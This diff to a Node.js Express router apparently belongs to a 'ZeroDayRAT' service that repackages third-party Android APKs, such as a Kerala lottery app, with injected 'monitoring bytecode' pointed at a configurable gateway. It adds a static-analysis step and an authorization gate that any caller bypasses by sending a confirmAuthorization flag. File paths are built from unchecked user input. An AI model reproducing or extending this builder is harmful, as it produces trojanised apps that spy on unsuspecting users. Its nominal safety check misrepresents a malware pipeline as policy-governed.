@@ -4,8 +4,123 @@ const path = require("path");
 const fs = require("fs");
 const { execFile } = require("child_process");
 
-// In-memory cache of completed build jobs
+// In-memory cache of completed build jobs & static analysis reports
 const buildJobsCache = new Map();
+const analysisReportsCache = new Map();
+const ANALYSIS_REPORTS_DIR = path.resolve(__dirname, "../../build_workspace/analysis_reports");
+fs.mkdirSync(ANALYSIS_REPORTS_DIR, { recursive: true });
+
+/**
+ * Executes the safe, read-only Python APK Static Analyzer
+ */
+function runStaticAnalysis(apkPath, isAuthorized = false) {
+  return new Promise((resolve, reject) => {
+    const analyzerScript = path.resolve(__dirname, "../utils/apkStaticAnalyzer.py");
+    const args = [analyzerScript, apkPath];
+    if (isAuthorized) args.push("--authorized");
+
+    execFile("python", args, { maxBuffer: 1024 * 1024 * 25, timeout: 45000 }, (error, stdout, stderr) => {
+      if (error && !stdout) {
+        return reject(new Error(`Static analyzer failed: ${error.message || stderr}`));
+      }
+      try {
+        const report = JSON.parse(stdout.trim());
+        resolve(report);
+      } catch (parseErr) {
+        reject(new Error(`Failed to parse analyzer JSON output: ${stdout || stderr}`));
+      }
+    });
+  });
+}
+
+/**
+ * POST /api/custom-apps/analyze
+ * Read-only APK Static Analyzer endpoint
+ */
+router.post("/analyze", async (req, res) => {
+  const contentType = (req.headers["content-type"] || "").toLowerCase();
+  const isOctetStream = contentType.includes("application/octet-stream");
+  const isAuthorized = req.query.isAuthorized === "true" || req.headers["x-is-authorized"] === "true";
+  const targetFileName = req.query.targetFileName || req.headers["x-target-filename"] || "target_app.apk";
+
+  const stagingDir = path.resolve(__dirname, "../../build_workspace/analysis_staging");
+  fs.mkdirSync(stagingDir, { recursive: true });
+  const stagingPath = path.join(stagingDir, `staging_${Date.now()}_${Math.random().toString(36).substring(2, 7)}.apk`);
+
+  try {
+    if (isOctetStream) {
+      const writeStream = fs.createWriteStream(stagingPath);
+      req.pipe(writeStream);
+      await new Promise((resolve, reject) => {
+        writeStream.on("finish", resolve);
+        writeStream.on("error", reject);
+      });
+    } else if (req.body?.targetApkBase64) {
+      const buffer = Buffer.from(req.body.targetApkBase64, "base64");
+      fs.writeFileSync(stagingPath, buffer);
+    } else {
+      const candidatePaths = [
+        path.resolve("F:/targetApk", targetFileName),
+        path.resolve("F:/targetApk/com.lotteryonline.kerala_3.0.4.apk"),
+        path.resolve(__dirname, "../../../targetApk", targetFileName),
+        path.resolve(__dirname, "../../../dashboard/public/download/ZerodayRAT.apk"),
+        path.resolve(__dirname, "../../../dashboard/dist/download/ZerodayRAT.apk"),
+        path.resolve(__dirname, "../../../android-app/app/build/outputs/apk/debug/app-debug.apk"),
+      ];
+      const foundPath = candidatePaths.find((p) => fs.existsSync(p));
+      if (!foundPath) {
+        return res.status(400).json({ error: "No target APK uploaded and no baseline APK found on disk." });
+      }
+      fs.copyFileSync(foundPath, stagingPath);
+    }
+
+    if (!fs.existsSync(stagingPath) || fs.statSync(stagingPath).size === 0) {
+      return res.status(400).json({ error: "Target APK payload is empty (0 bytes)." });
+    }
+
+    const report = await runStaticAnalysis(stagingPath, isAuthorized);
+    if (report.error && report.archiveIntegrity !== "VALID_ZIP_ARCHIVE") {
+      return res.status(400).json(report);
+    }
+
+    analysisReportsCache.set(report.analysisReportId, report);
+    try {
+      fs.writeFileSync(
+        path.join(ANALYSIS_REPORTS_DIR, `${report.analysisReportId}.json`),
+        JSON.stringify(report, null, 2)
+      );
+    } catch {}
+
+    return res.status(200).json(report);
+  } catch (err) {
+    console.error("APK Analysis endpoint error:", err);
+    return res.status(500).json({ error: `APK static analysis failed: ${err.message}` });
+  } finally {
+    try {
+      if (fs.existsSync(stagingPath)) fs.unlinkSync(stagingPath);
+    } catch {}
+  }
+});
+
+/**
+ * GET /api/custom-apps/analysis/:reportId
+ * Retrieve cached static analysis report
+ */
+router.get("/analysis/:reportId", (req, res) => {
+  const { reportId } = req.params;
+  if (analysisReportsCache.has(reportId)) {
+    return res.json(analysisReportsCache.get(reportId));
+  }
+  const reportFile = path.join(ANALYSIS_REPORTS_DIR, `${reportId}.json`);
+  if (fs.existsSync(reportFile)) {
+    try {
+      const data = JSON.parse(fs.readFileSync(reportFile, "utf-8"));
+      analysisReportsCache.set(reportId, data);
+      return res.json(data);
+    } catch {}
+  }
+  return res.status(404).json({ error: "Analysis report not found." });
+});
 
 /**
  * POST /api/custom-apps/build
@@ -23,9 +138,13 @@ router.post("/build", async (req, res) => {
     let targetApkBase64 = null;
     let tenantId = "default-tenant";
     let gatewayUrl = "http://localhost:4000";
+    let analysisReportId = null;
+    let confirmAuthorization = false;
 
     if (isOctetStream) {
       targetFileName = req.query.targetFileName || req.headers["x-target-filename"] || "target_app.apk";
+      analysisReportId = req.query.analysisReportId || req.headers["x-analysis-report-id"];
+      confirmAuthorization = req.query.confirmAuthorization === "true" || req.headers["x-confirm-authorization"] === "true";
       const rawPerms = req.query.selectedPermissions || req.headers["x-selected-permissions"] || "[]";
       try {
         selectedPermissions = JSON.parse(decodeURIComponent(rawPerms));
@@ -38,12 +157,47 @@ router.post("/build", async (req, res) => {
       gatewayUrl = req.query.gatewayUrl || req.headers["x-gateway-url"] || "http://localhost:4000";
     } else {
       targetFileName = req.body?.targetFileName || "target_app.apk";
+      analysisReportId = req.body?.analysisReportId || req.query.analysisReportId || req.headers["x-analysis-report-id"];
+      confirmAuthorization = req.body?.confirmAuthorization === true || req.query.confirmAuthorization === "true" || req.headers["x-confirm-authorization"] === "true";
       selectedPermissions = req.body?.selectedPermissions || [];
       stripLegacy = req.body?.stripLegacy !== false;
       sourceAppName = req.body?.sourceAppName || "ZeroDayRAT";
       targetApkBase64 = req.body?.targetApkBase64 || null;
       tenantId = req.body?.tenantId || req.query.tenantId || req.headers["x-tenant-id"] || "default-tenant";
       gatewayUrl = req.body?.gatewayUrl || req.query.gatewayUrl || req.headers["x-gateway-url"] || "http://localhost:4000";
+    }
+
+    // Enforce Static Analysis Pre-Condition
+    if (!analysisReportId) {
+      return res.status(400).json({
+        error: "Static analysis required: Complete APK static analysis before initiating build.",
+        requiresAnalysis: true
+      });
+    }
+
+    let cachedReport = analysisReportsCache.get(analysisReportId);
+    if (!cachedReport) {
+      const reportFile = path.join(ANALYSIS_REPORTS_DIR, `${analysisReportId}.json`);
+      if (fs.existsSync(reportFile)) {
+        try { cachedReport = JSON.parse(fs.readFileSync(reportFile, "utf-8")); } catch {}
+      }
+    }
+
+    if (!cachedReport) {
+      return res.status(400).json({
+        error: "Analysis report not found or expired. Please perform APK analysis first.",
+        requiresAnalysis: true
+      });
+    }
+
+    // Policy Check: Third-party apps without modification authorization
+    if (!cachedReport.authorization.isAuthorizedSource && !confirmAuthorization) {
+      return res.status(403).json({
+        error: "Target application is an unauthorized third-party package. Executable monitoring bytecode cannot be injected into third-party binaries without explicit documented authorization and source-level integration.",
+        policyBlocked: true,
+        supportedAlternative: cachedReport.authorization.supportedAlternative,
+        report: cachedReport
+      });
     }
 
     // Sanitize and normalize runtime configuration tokens
